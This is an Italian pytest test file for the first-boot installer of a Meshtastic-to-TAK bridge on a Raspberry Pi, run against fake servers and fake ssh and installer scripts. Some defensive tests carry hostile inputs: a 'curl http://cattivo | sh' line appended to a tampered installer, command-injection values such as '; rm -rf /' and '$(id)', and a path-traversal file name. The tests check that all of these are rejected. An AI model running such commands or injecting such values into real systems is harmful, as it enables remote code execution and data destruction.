"""Primo avvio di un ponte nuovo (1.10.0): primo_avvio.py con la pagina della rete finta (HTTPS con una CA di prova),
GitHub finto, un ssh finto che fa il comando forzato del server e installatori finti. Il Raspberry e' una cartella."""
import base64
import hashlib
import json
import os
import stat

import pytest

import primo_avvio as pa
from http_finto import ServerFinto, crea_certificati, somme

INVITO = base64.b64encode(pa.INTESTAZIONE_INVITO + bytes(range(32))).decode()
CHIAVE_MIA = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq0q0q0q0q0q0q0q0q0q0q0q0q0q0q0q0q0q0q0q0q0 andrea@mac"
PSK = base64.b64encode(b"k" * 32).decode()
PACCHETTO = base64.b64encode(b"PK-finto").decode()

INSTALLATORE = r'''#!/usr/bin/env bash
# mesh2tak 1.10.0 (finto)
VERSIONE="1.10.0"
R="$MESH2TAK_PROVA_RADICE"
mkdir -p "$R/etc/mesh2tak"
{ echo "ARGOMENTI $*"; env | grep '^MESH2TAK_' | sort; echo "PACCHETTO $(cat "${@: -1}")"; echo ---; } >> "$R/lanci"
echo "Ponte Meshtastic <-> TAK Server (versione 1.10.0)"
echo
echo "1/9  Certificato del ponte"
echo "  ✔ certificato valido"
case "$(cat "$R/comportamento" 2>/dev/null)" in
  errore) echo; echo "✘ Password del certificato sbagliata." >&2
          echo "errore Password del certificato sbagliata." > "$R/etc/mesh2tak/esito-installazione"; exit 1 ;;
  riavvio) echo; echo "2/9  Aggiornamento del Raspberry"
          mkdir -p "$R/etc/systemd/system"; : > "$R/etc/systemd/system/mesh2tak-installazione.service"
          echo riavvio > "$R/etc/mesh2tak/esito-installazione"
          echo "Il Raspberry ora si riavvia."; exit 0 ;;
  muore) exit 137 ;;
esac
echo; echo "9/9  Avvio del ponte"
echo "ok 1.10.0" > "$R/etc/mesh2tak/esito-installazione"
echo "Fatto."
'''.encode()

SSH_FINTO = r'''#!/usr/bin/env bash
# fa il comando forzato del server: l'ultimo argomento e' il comando chiesto
R="$MESH2TAK_PROVA_RADICE"
comando="${@: -1}"
echo "$comando" >> "$R/ssh-comandi"
case "$comando" in
  configurazione) [ -f "$R/server-configurazione.json" ] || { echo "nessuna configurazione" >&2; exit 3; }
                  cat "$R/server-configurazione.json" ;;
  avanzamento\ *) echo "$comando" >> "$R/avanzamento" ;;
  *) exit 2 ;;
esac
'''

SYSTEMCTL_FINTO = r'''#!/usr/bin/env bash
R="$MESH2TAK_PROVA_RADICE"
case "$1" in
  is-active) cat "$R/unita-attiva" 2>/dev/null || echo inactive ;;
  is-enabled) cat "$R/unita-abilitata" 2>/dev/null || echo disabled ;;
esac
exit 0
'''


@pytest.fixture(scope="module")
def certificati(tmp_path_factory):
    return crea_certificati(tmp_path_factory.mktemp("ca"))


class Raspberry:
    def __init__(self, t, certificati, monkeypatch, invito=True):
        self.t = t
        self.registrazione = None
        self.hub = ServerFinto({"POST /accesso/richiesta": lambda corpo: (202, {"esito": "in_attesa",
                                                                             "controllo": "ABC-123",
                                                                             "in_corso": True})}, tls=certificati)
        self.github = ServerFinto({})
        self.pubblica(INSTALLATORE)
        for f, testo in (("ssh", SSH_FINTO), ("systemctl", SYSTEMCTL_FINTO)):
            (t / "bin").mkdir(exist_ok=True)
            (t / "bin" / f).write_text(testo)
            os.chmod(t / "bin" / f, 0o755)
        self.casa = t / "home/andrea/.ssh"
        self.casa.mkdir(parents=True)
        righe = [CHIAVE_MIA] + ([f"ssh-ed25519 {INVITO} mesh2tak-invito {self.hub.url}"] if invito else [])
        (self.casa / "authorized_keys").write_text("\n".join(righe) + "\n")
        os.chmod(self.casa / "authorized_keys", 0o600)
        for f in ("etc/systemd/system/multi-user.target.wants", "usr/local/lib/mesh2tak", "proc/device-tree"):
            (t / f).mkdir(parents=True)
        (t / "proc/device-tree/model").write_bytes(b"Raspberry Pi 3 Model B Rev 1.2\x00")
        (t / pa.UNITA[1:]).write_text("[Unit]\n")
        (t / pa.PROGRAMMA[1:]).write_text("# programma\n")
        os.symlink(pa.UNITA, t / "etc/systemd/system/multi-user.target.wants/mesh2tak-primo-avvio.service")
        monkeypatch.setattr(pa, "RADICE", str(t))
        monkeypatch.setattr(pa, "GITHUB", self.github.url)
        monkeypatch.setattr(pa, "VERSIONE", "1.10.0")
        monkeypatch.setenv("MESH2TAK_PROVA_RADICE", str(t))
        monkeypatch.setenv("MESH2TAK_PROVA_SSH", str(t / "bin/ssh"))
        monkeypatch.setenv("SSL_CERT_FILE", str(certificati / "ca.pem"))
        monkeypatch.setenv("PATH", f"{t / 'bin'}:{os.environ['PATH']}")
        monkeypatch.setattr(pa.socket, "gethostname", lambda: "ponte-velate")
        self.st = {}

    def pubblica(self, installatore, somma_di=None):
        base = f"/{pa.REPO}/releases/download/v1.10.0"
        self.github.risposte[f"{base}/{pa.INSTALLATORE}"] = installatore
        self.github.risposte[f"{base}/SHA256SUMS"] = somme({pa.INSTALLATORE: somma_di or installatore,
                                                            "rete-meshtastic.sh": b"x"})

    def registra(self, tentativo=1):
        """La rete ha approvato: pubblica la registrazione e prepara la configurazione sul server."""
        chiave = (self.t / "etc/mesh2tak/accesso/chiave.pub").read_text()
        impronta = hashlib.sha256(base64.b64decode(chiave.split()[1])).hexdigest()
        reg = {"formato": 1, "nome": "velate", "utente": "ponte-velate", "porta": 19402, "ssh_host": "127.0.0.1",
               "ssh_porta": 2222, "chiavi_host": ["ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIserverserverserverserver"]}
        if tentativo:
            reg["installa"] = {"tentativo": tentativo}
        self.hub.risposte[f"/accesso/{impronta}.json"] = reg
        return impronta

    def configura(self, tentativo=1, **cambi):
        conf = {"formato": 1, "nome": "velate", "scheda": "waveshare", "posizione": "45.8205,8.8257",
                "rete": self.hub.url, "versione": "1.10.0", "tentativo": tentativo,
                "tak": {"pacchetto": PACCHETTO, "nome_pacchetto": "meshtastic-cnsas-integration.zip",
                        "password": "atakatak", "host": ""},
                "canale": {"nome": "CNSAS-VA", "chiave": PSK, "secondario": ""}}
        conf.update(cambi)
        (self.t / "server-configurazione.json").write_text(json.dumps(conf))

    def giro(self):
        return pa.giro(self.st)

    def avanzamento(self):
        f = self.t / "avanzamento"
        return [r.split(" ", 2)[1:] for r in f.read_text().splitlines()] if f.exists() else []

    def lanci(self):
        f = self.t / "lanci"
        return f.read_text().split("---\n")[:-1] if f.exists() else []

    def segreti_rimasti(self):
        trovati = []
        for cartella, _d, file in os.walk(self.t / pa.STATO_DIR[1:]):
            for f in file:
                testo = open(os.path.join(cartella, f), "rb").read()
                if PSK.encode() in testo or PACCHETTO.encode() in testo or b"PK-finto" in testo or b"atakatak" in testo:
                    trovati.append(f)
        return trovati


@pytest.fixture
def rasp(tmp_path, certificati, monkeypatch):
    return Raspberry(tmp_path, certificati, monkeypatch)


def test_chiave_d_invito_tra_le_chiavi_ssh(rasp):
    assert pa.trova_inviti() == (rasp.hub.url, [INVITO])
    assert pa.leggi_invito(CHIAVE_MIA) is None
    for sbagliata in (f"ssh-ed25519 {INVITO} mesh2tak-invito http://rete.example",       # non https
                      f"ssh-ed25519 {INVITO} mesh2tak-invito https://rete.example/x?y",
                      f"ssh-ed25519 AAAA mesh2tak-invito https://rete.example",
                      f"ssh-rsa {INVITO} mesh2tak-invito https://rete.example",
                      f"ssh-ed25519 {INVITO} altro https://rete.example"):
        assert pa.leggi_invito(sbagliata) is None, sbagliata
    assert pa.leggi_invito(f"ssh-ed25519 {INVITO} mesh2tak-invito https://meshtastic.example.org/") == (
        "https://meshtastic.example.org", INVITO)
    pa.togli_inviti()
    f = rasp.casa / "authorized_keys"
    assert f.read_text() == CHIAVE_MIA + "\n" and stat.S_IMODE(os.stat(f).st_mode) == 0o600


def test_dall_invito_al_ponte_installato(rasp):
    assert rasp.giro() == 30
    percorso, corpo = rasp.hub.spedite[0]
    d = json.loads(corpo)
    assert percorso == "/accesso/richiesta" and d["nome"] == "velate" and d["macchina"] == "ponte-velate"
    assert d["nuovo"] == {"modello": "Raspberry Pi 3 Model B Rev 1.2", "inviti": [INVITO], "radio_usb": False}
    assert d["chiave"].startswith("ssh-ed25519 ") and d["versione"] == "1.10.0"
    chiave = rasp.t / "etc/mesh2tak/accesso/chiave"
    assert stat.S_IMODE(os.stat(chiave).st_mode) == 0o600
    assert rasp.giro() == 30 and len(rasp.hub.spedite) == 1           # non ripete la richiesta a ogni giro
    rasp.registra()
    rasp.configura()
    assert rasp.giro() is None
    lancio = rasp.lanci()[0]
    assert "ARGOMENTI --scheda waveshare --canale-squadra --accesso-esterno=velate " in lancio
    assert lancio.splitlines()[0].endswith("/meshtastic-cnsas-integration.zip") and "PACCHETTO PK-finto" in lancio
    for riga in ("MESH2TAK_PASSWORD=atakatak", "MESH2TAK_CANALE_SQUADRA=CNSAS-VA", f"MESH2TAK_CHIAVE_CANALE={PSK}",
                 "MESH2TAK_SECONDARIO=", "MESH2TAK_POSIZIONE=45.8205,8.8257", f"MESH2TAK_ACCESSO_RETE={rasp.hub.url}"):
        assert riga in lancio.splitlines(), riga
    assert "MESH2TAK_HOST" not in lancio
    fasi = rasp.avanzamento()
    assert [f[0] for f in fasi] == ["scarico", "installo", "installo", "installo", "fatto"]
    assert fasi[2][1] == "1/9 Certificato del ponte" and fasi[3][1] == "9/9 Avvio del ponte"
    assert "installato: mesh2tak 1.10.0" in fasi[-1][1]
    assert not any(PSK in riga or "atakatak" in riga for riga in (rasp.t / "ssh-comandi").read_text().splitlines())
    # finito: niente certificato ne' chiavi in giro, invito tolto, il programma si toglie da solo
    assert rasp.segreti_rimasti() == []
    assert sorted(os.listdir(rasp.t / pa.STATO_DIR[1:])) == ["installazione.log", "stato.json"]
    assert (rasp.casa / "authorized_keys").read_text() == CHIAVE_MIA + "\n"
    assert not os.path.exists(rasp.t / pa.UNITA[1:]) and not os.path.exists(rasp.t / pa.PROGRAMMA[1:])
    assert not os.path.lexists(rasp.t / "etc/systemd/system/multi-user.target.wants/mesh2tak-primo-avvio.service")
    assert chiave.exists()                                           # la chiave resta: e' quella del ponte
    assert rasp.st["fase"] == "fatto" and rasp.giro() is None
    assert "primo avvio finito" in (rasp.t / pa.REGISTRO[1:]).read_text()
    assert PSK not in (rasp.t / pa.REGISTRO[1:]).read_text()


def test_riavvio_a_meta_poi_riprende_e_riferisce(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    (rasp.t / "comportamento").write_text("riavvio")
    assert rasp.giro() == 600 and rasp.st["fase"] == "riavvio"
    assert rasp.avanzamento()[-1][0] == "riavvio"
    # dopo il riavvio: lo stato si rilegge dal disco, l'installatore riprende da solo (unita' abilitata, poi attiva)
    rasp.st = pa.carica_stato()
    (rasp.t / "unita-abilitata").write_text("enabled\n")
    assert rasp.giro() == 20 and len(rasp.lanci()) == 1
    (rasp.t / "unita-abilitata").write_text("disabled\n")
    (rasp.t / "unita-attiva").write_text("activating\n")
    (rasp.t / "etc/mesh2tak/esito-installazione").write_text("in_corso\n")
    (rasp.t / "etc/mesh2tak/installazione-schermo.log").write_text(
        "2/9  Aggiornamento del Raspberry\n\n=== 2026-11-10 dopo il riavvio l'installazione riprende da sola\n"
        "\x1b[1m3/9  Meshtastic per la scheda LoRa (waveshare)\x1b[0m\n  ok\n\n5/9  Programma del ponte\n")
    assert rasp.giro() == 20
    assert rasp.avanzamento()[-1] == ["installo", "5/9 Programma del ponte"]
    assert rasp.giro() == 20 and rasp.avanzamento()[-1] == ["installo", "5/9 Programma del ponte"]   # una volta sola
    (rasp.t / "etc/mesh2tak/esito-installazione").write_text("ok 1.10.0\n")
    os.unlink(rasp.t / "etc/systemd/system/mesh2tak-installazione.service")
    assert rasp.giro() is None and rasp.avanzamento()[-1][0] == "fatto"
    assert rasp.segreti_rimasti() == [] and len(rasp.lanci()) == 1


def test_errore_poi_riprova_dalla_pagina(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    (rasp.t / "comportamento").write_text("errore")
    assert rasp.giro() == 60
    assert rasp.avanzamento()[-1] == ["errore", "Password del certificato sbagliata. (riprovo da solo tra 10 minuti)"]
    assert rasp.giro() == 60 and len(rasp.lanci()) == 1              # aspetta: non rilancia subito
    # dalla pagina: "Riprova" con la password giusta -> tentativo 2, configurazione nuova
    (rasp.t / "comportamento").write_text("")
    rasp.registra(tentativo=2)
    rasp.configura(tentativo=2, scheda="usb")
    assert rasp.giro() is None
    assert len(rasp.lanci()) == 2 and "ARGOMENTI --scheda usb " in rasp.lanci()[1]
    assert rasp.avanzamento()[-1][0] == "fatto"


def test_errore_dopo_il_riavvio(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    (rasp.t / "comportamento").write_text("riavvio")
    rasp.giro()
    (rasp.t / "etc/mesh2tak/esito-installazione").write_text("errore La scheda LoRa non risponde: controlla che sia "
                                                             "montata bene sui pin.\n")
    os.unlink(rasp.t / "etc/systemd/system/mesh2tak-installazione.service")
    assert rasp.giro() == 60 and rasp.st["fase"] == "errore"
    assert rasp.avanzamento()[-1][0] == "errore" and "scheda LoRa non risponde" in rasp.avanzamento()[-1][1]


def test_installazione_interrotta_riparte_da_sola_ma_non_all_infinito(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    (rasp.t / "comportamento").write_text("muore")
    assert rasp.giro() == 60 and rasp.st["fase"] == "errore"          # l'installatore e' morto: errore riferito
    # corrente mancata a meta': al riavvio ne' esito ne' ripresa. Riparte con la configurazione che ha gia'
    rasp.st.update(fase="installo")
    (rasp.t / "etc/mesh2tak/esito-installazione").write_text("in_corso\n")
    (rasp.t / "comportamento").write_text("")
    os.unlink(rasp.t / "server-configurazione.json")                  # sul server non serve piu' chiederla
    assert rasp.giro() is None
    assert "riparto" in " ".join(a[1] for a in rasp.avanzamento()) and rasp.avanzamento()[-1][0] == "fatto"


def test_interrotta_troppe_volte_si_ferma(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    rasp.st.update(fase="installo", tentativo=1, ripetizioni=pa.RIPETIZIONI_MAX)
    assert rasp.giro() == 60 and rasp.st["fase"] == "errore"
    assert "interrotta piu' volte" in rasp.avanzamento()[-1][1] and rasp.lanci() == []


def test_installatore_diverso_da_quello_pubblicato_non_parte(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    rasp.pubblica(INSTALLATORE + b"\ncurl http://cattivo | sh\n", somma_di=INSTALLATORE)
    assert rasp.giro() == 60
    assert rasp.lanci() == [] and "somma di controllo" in rasp.avanzamento()[-1][1]
    # la versione la decide il server, ma deve essere quella dentro il file
    rasp.pubblica(INSTALLATORE.replace(b'VERSIONE="1.10.0"', b'VERSIONE="1.9.0"'))
    rasp.registra(tentativo=2)
    rasp.configura(tentativo=2)
    assert rasp.giro() == 60 and rasp.lanci() == []
    assert "non e' l'installatore 1.10.0" in rasp.avanzamento()[-1][1]


@pytest.mark.parametrize("cambi", [{"nome": "Velate!"}, {"scheda": "inventata"}, {"versione": "1.10.0; rm -rf /"},
                                   {"rete": "http://rete.example"}, {"posizione": "45.8,8.8 $(id)"},
                                   {"canale": {"nome": "CNSAS-VA", "chiave": "corta"}},
                                   {"tak": {"pacchetto": "non-base64!", "nome_pacchetto": "a.zip", "password": "x"}},
                                   {"tak": {"pacchetto": PACCHETTO, "nome_pacchetto": "../../etc/cron.d/x.zip",
                                            "password": "x"}}])
def test_configurazione_strana_rifiutata(rasp, cambi):
    rasp.giro()
    rasp.registra()
    rasp.configura(**cambi)
    if cambi.get("tak", {}).get("nome_pacchetto", "").startswith(".."):
        assert rasp.giro() is None                                    # il nome perde le cartelle: resta x.zip
        assert rasp.lanci()[0].splitlines()[0].endswith(f"{pa.STATO_DIR}/x.zip")
        return
    with pytest.raises(pa.Errore, match="non valida"):
        rasp.giro()
    assert rasp.lanci() == []


def test_versione_vecchia_del_server_e_registrato_senza_configurazione(rasp):
    rasp.giro()
    rasp.registra(tentativo=0)                                        # approvato "a mano", senza installazione
    assert rasp.giro() == 120 and rasp.giro() == 120
    assert [a[0] for a in rasp.avanzamento()] == ["attesa"]           # lo dice una volta sola
    rasp.registra()
    rasp.configura(versione="1.9.0")
    with pytest.raises(pa.Errore, match="1.9.0"):
        rasp.giro()


def test_senza_invito(tmp_path, certificati, monkeypatch):
    rasp = Raspberry(tmp_path, certificati, monkeypatch, invito=False)
    assert rasp.giro() == 300 and rasp.giro() == 300
    assert (tmp_path / pa.REGISTRO[1:]).read_text().count("non c'e' la chiave d'invito") == 1
    assert rasp.hub.spedite == []
    # con l'indirizzo scritto a mano sulla microSD chiede di entrare senza invito (si approva a mano)
    (tmp_path / "boot/firmware").mkdir(parents=True)
    (tmp_path / "boot/firmware/mesh2tak-rete.txt").write_text(rasp.hub.url + "/\n")
    rasp.hub.risposte["POST /accesso/richiesta"] = (202, {"esito": "in_attesa", "controllo": "K7Q-3MX"})
    assert rasp.giro() == 30
    assert json.loads(rasp.hub.spedite[0][1])["nuovo"]["inviti"] == []
    assert "codice di controllo K7Q-3MX" in (tmp_path / pa.REGISTRO[1:]).read_text()


def test_rete_che_rifiuta(rasp):
    rasp.hub.risposte["POST /accesso/richiesta"] = (403, {"errore": "richiesta rifiutata"})
    assert rasp.giro() == 30
    assert rasp.st["prossima_richiesta"] - pa.time.time() > 3000
    assert "rifiutato" in (rasp.t / pa.REGISTRO[1:]).read_text()


def test_errore_riprova_da_solo_due_volte_poi_aspetta(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    (rasp.t / "comportamento").write_text("errore")
    assert rasp.giro() == 60 and len(rasp.lanci()) == 1
    for volta in (2, 3):
        rasp.st["riprova_alle"] = 0                                   # passati i 10 minuti
        assert rasp.giro() == 60 and len(rasp.lanci()) == volta      # con la configurazione che ha gia'
    assert rasp.avanzamento()[-1] == ["errore", "Password del certificato sbagliata."]   # niente piu' "riprovo"
    rasp.st["riprova_alle"] = 0
    assert rasp.giro() == 60 and len(rasp.lanci()) == 3              # adesso aspetta la pagina
    assert (rasp.t / "ssh-comandi").read_text().count("configurazione") == 1
    # con internet che va e viene la si riprova: dopo "Riprova" dalla pagina si ricomincia da capo
    (rasp.t / "comportamento").write_text("")
    rasp.registra(tentativo=2)
    rasp.configura(tentativo=2)
    assert rasp.giro() is None and rasp.st["fase"] == "fatto"


def test_dopo_il_riavvio_senza_rete_segue_lo_schermo(rasp):
    rasp.giro()
    rasp.registra()
    rasp.configura()
    (rasp.t / "comportamento").write_text("riavvio")
    rasp.giro()
    rasp.st = pa.carica_stato()
    rasp.hub.risposte.clear()                                         # la pagina della rete non risponde
    rasp.hub.ferma() if hasattr(rasp.hub, "ferma") else None
    (rasp.t / "unita-attiva").write_text("activating\n")
    (rasp.t / "etc/mesh2tak/installazione-schermo.log").write_text("\n=== dopo il riavvio\n6/9  Programmi del ponte\n")
    assert rasp.giro() == 20
    assert rasp.avanzamento()[-1] == ["installo", "6/9 Programmi del ponte"]   # via SSH, con la registrazione ricordata
